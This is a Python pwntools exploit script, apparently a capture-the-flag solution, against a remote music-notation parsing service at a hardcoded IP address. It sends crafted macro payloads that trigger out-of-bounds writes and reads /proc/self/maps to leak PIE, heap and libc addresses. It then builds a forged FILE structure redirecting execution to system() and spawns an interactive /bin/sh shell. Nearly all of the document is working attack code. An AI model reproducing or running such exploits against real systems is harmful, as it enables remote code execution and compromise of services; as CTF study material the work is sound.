from pwn import *
import os
import binascii
#r = process('./chall')
r = remote("111.186.58.135",12580)
#r = remote("localhost",8888)

os.system("rm ./*.pmx ; rm ./*.mtx") # just cleanup

def upload(index,data,with_newline=True):
	r.sendlineafter(":","1")
	r.sendlineafter(":",str(index))
	r.recvuntil(":")
	r.sendlineafter(":",str(len(data)))
	if with_newline:
		r.sendlineafter(":",data)
	else:
		r.sendafter(":",data)


def gen(index):
	r.sendlineafter(":","2")
	r.sendlineafter(":",str(index))


# prepare fake style entry near stdout (MS-65) and pad the section where /proc/self/maps 
# output will be stored so it can be later dumped through same macro op

payload = """
ENABLE: debugMode
ENABLE: beVerbose
ENABLE: ignoreErrors
ENABLE: expandMacro
Style: Woodwind Violins
Woodwind: Voices FlObCl; Clefs G
Violins: Voices Violini; Clefs G
Flats: 1
meter: C

MS-175 %s M
MS-65 %s M
""" % (("A"*0xbf),(("Q"*0xc0) + "iiiiiii:" ) ) 


upload(0,payload)
#pause()
gen(0)

r.recvuntil("Do you want to show the result?[y/n]")
r.sendline("n")

data ="L"* 0xb0
# get ez leaks
payload = """
ENABLE: debugMode
ENABLE: beVerbose
ENABLE: ignoreErrors
ENABLE: expandMacro
Style: Woodwind Violins
Violins: Voices Violini; Clefs G
Woodwind: Voices FlObCl; Clefs G
Flats: 1
meter: C

MS241 %s M

INCLUDE:/proc/self/maps
""" % ((data))



upload(10,payload)

gen(10)



r.recvuntil("7 >> ")

r.recvuntil("2 >> ")
tmp = r.recvuntil("-")[:-1]
if len(tmp) % 2:
	tmp += "0"
print("A")
print(tmp)
pie_base =  u64(binascii.unhexlify(tmp)[::-1].ljust(8,"\x00"))
log.success("pie_base -> "+hex(pie_base))

r.recvuntil("7 >> ")
tmp = r.recvuntil("-")[:-1]
if len(tmp) % 2:
	tmp += "0"
print("A")
print(tmp)
heap_ptr =  u64(binascii.unhexlify(tmp)[::-1].ljust(8,"\x00"))
log.success("HEAP -> "+hex(heap_ptr))


r.recvuntil("8 >> ")
tmp = r.recvuntil("-")[:-1]
if len(tmp) % 2:
	tmp += "0"
print("A")
print(tmp)
libc =  u64(binascii.unhexlify(tmp)[::-1].ljust(8,"\x00"))
log.success("LIBC -> "+hex(libc))

#pause()
#r.interactive()
r.recvuntil("Do you want to show the result?[y/n]")
r.sendline("n")


# MP-64 M gives libc leak from stderr pointer
# MP-121 overwrites known_styles index so we can go negative OOB to overwrite value without "\x20" at the end of the string that is always
# included in macro oob write primitive
# actually useless
payload = """
ENABLE: debugMode
ENABLE: beVerbose
ENABLE: ignoreErrors
ENABLE: expandMacro
Style: Woodwind Violins
Flats: 1
meter: C


%%MS-64 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA M
MP-64 M
%%MS-121 %%s M
""" #% (("A" * 0x9c )) #+ (p16(0xfffb)+p16(0xffff))) # known_styles idx (0xfffb)


upload(1,payload)
#pause()
gen(1)




#pause()

r.recvuntil("Inserting macro")
r.recvuntil("text \"")




r.recvuntil("Do you want to show the result?[y/n]")
r.sendline("n")

# stylefilename is patched to proc maps path, it will be loaded later, even though it will error contents will still be in memory
# UNUSED
payload = """
ENABLE: debugMode
ENABLE: beVerbose
ENABLE: ignoreErrors
ENABLE: expandMacro
meter: C
Style: iiiiiiii
iiiiiiii: Voices AAAAAAAAAA; Clefs %s

MS1 AAA M
""" %(  (("X" * 0x3d ) + "/proc/self/maps") ) 


#upload(2,payload)
#pause()
#gen(2)

#r.recvuntil("Do you want to show the result?[y/n]")
#r.sendline("n")

# this one forces style load and dumps the contents from memory.
#UNUSEDs
payload = """
%ENABLE: debugMode
%ENABLE: beVerbose
ENABLE: ignoreErrors
ENABLE: expandMacro
Style: Woodwind Violins
Woodwind: Voices FlObCl; Clefs G
Violins: Voices Violini; Clefs G
meter: C

MP-175
MP343 M
"""

#upload(3,payload)
#pause()
#gen(3)
#r.interactive()

#r.recvuntil("Word types: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ")
#pie_base = (u64(binascii.unhexlify(r.recvuntil("-")[:-1])[::-1].ljust(8,"\x00")) - 0x25000) + 0x8000
#log.success("PIE -> " + hex(pie_base))



#pause()


# prepare fake FILE struct
binsh = libc+0x1b75aa
#fake_vtable_addr = 0x4141414141414141
fake_vtable_addr = libc + 0x1ed4a0# + 0xa0
free_hook = libc+ 0x1eeb28

system = libc + 0x55410
SOME_NULL_ADDR = pie_base + 0x20630
def pack_file(_flags = 0x0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0):
    struct = p32(_flags) + \
             p32(0) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xd8, "\x00")
    return struct

file_struct = pack_file(_IO_write_end=(free_hook + 0x6), _IO_write_ptr=(free_hook - 0x5), _lock=SOME_NULL_ADDR)
file_struct += p64(fake_vtable_addr)
file_struct += p64(system)
file_struct = file_struct.ljust(0x100, "\x00")

upload(12,("z" * 0x220 )+ file_struct)

#pause()

# patch index again, this time we go in positive direction and to stop successfully we have to hit fake entry that was prepared in first step

payload = """
Flats: 1
meter: C
Style: Woodwind
Woodwind: Voices FlObCl; Clefs G

MS-121 %s M
""" % (("A" * 0x9c ) + (p16(0x1010)+p16(0xffff))) # known_styles idx

upload(6,payload)
pause()
gen(6)


r.recvuntil("Do you want to show the result?[y/n]")
r.sendline("n")

# this patches stdout pointer :)
# first write stdin pointer and then quickly do the second and third write to restore stdout ptr and plug in null bytes

#guess = 0xdeadbeeffeedface
guess = heap_ptr + 0x2420
log.info(" guess -> " + hex(guess)  )

payload = """
SUSPEND: 1
meter: C

Style: iiiiiii
iiiiiii: Voices AAAAAA; Clefs %s

%s
""" %(  (("XX") + p64(guess)),
 		p64(system))
	    #(("X" * 3 ) + p64(stdout_ptr)), # need one more null byte
	    #(("X" * 2 ) + p64(stdout_ptr)))#, # stdout
	    #( "SUSPEND\nMS-121 123 M\nRESUME"))



upload(7,payload,False)
gen(7)




r.sendline("n")

payload ="/bin/sh"
sleep(1)
#r.sendline("1")
r.sendline("1")
sleep(1)
r.sendline("11")
sleep(1)
r.sendline(str(len(payload)))
sleep(1)
r.sendline(payload)

#upload(13,payload)
#r.interactive()

r.interactive()

# b * "getNextMusWord+1394"
